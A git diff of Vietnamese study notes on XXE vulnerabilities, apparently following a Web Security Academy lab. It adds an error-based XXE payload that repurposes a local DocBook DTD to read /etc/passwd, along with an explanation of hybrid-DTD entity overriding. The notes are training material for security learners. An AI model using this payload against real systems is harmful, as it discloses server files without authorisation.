@@ -16,7 +16,7 @@ image:
 ### **XML (Extensible Markup Language)**
 - **XML (Extensible Markup Language)** là một ngôn ngữ đánh dấu được thiết kế để lưu trữ và truyền dữ liệu.
 - Cấu trúc của **XML** giống như **HTML**: gồm các thẻ **(tags)** và dữ liệu, tổ chức theo dạng cây.
-- Không giống **HTML**, **XML** không có sẵn các thẻ cố định — bạn có thể tự đặt tên thẻ để mô tả dữ liệu.
+- Không giống **HTML**, **XML** không có sẵn các thẻ cố định — có thể tự đặt tên thẻ để mô tả dữ liệu.
 - Trước kia **XML** rất phổ biến trong web (ví dụ: **AJAX** là viết tắt của **Asynchronous JavaScript And XML**), nhưng hiện tại đã được thay thế nhiều bởi **JSON**.
 
 ### **XML Entities**
@@ -346,6 +346,30 @@ sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 ```
+
+### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+- Tương tự như lab trên nhưng thay đổi payload thành:
+
+```http
+POST /product/stock HTTP/2
+Host: 0af3000803a01dc482395db800c2009d.web-security-academy.net
+...
+<!DOCTYPE message [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+```
+- **XML parser** cho phép ghi đè **entity** đã định nghĩa trong **DTD** bên ngoài nếu **DTD** sử dụng kết hợp nội bộ + bên ngoài **(hybrid DTD).**
+- Điều này tạo ra lỗ hổng trong quy chuẩn **XML**, nơi có thể sử dụng **entity** tham số trong định nghĩa của **entity** khác — điều vốn bị cấm trong **DTD** nội bộ hoàn toàn.
+- Vậy nên, nếu tìm thấy một file **DTD** cục bộ hợp lệ, có thể:
+    - Nạp file **DTD** đó vào như external **DTD**.
+    - Ghi đè một **entity** đã được định nghĩa sẵn trong đó để chèn payload khai thác kiểu **error-based XXE**.
 
 ## Prevent
 --- 
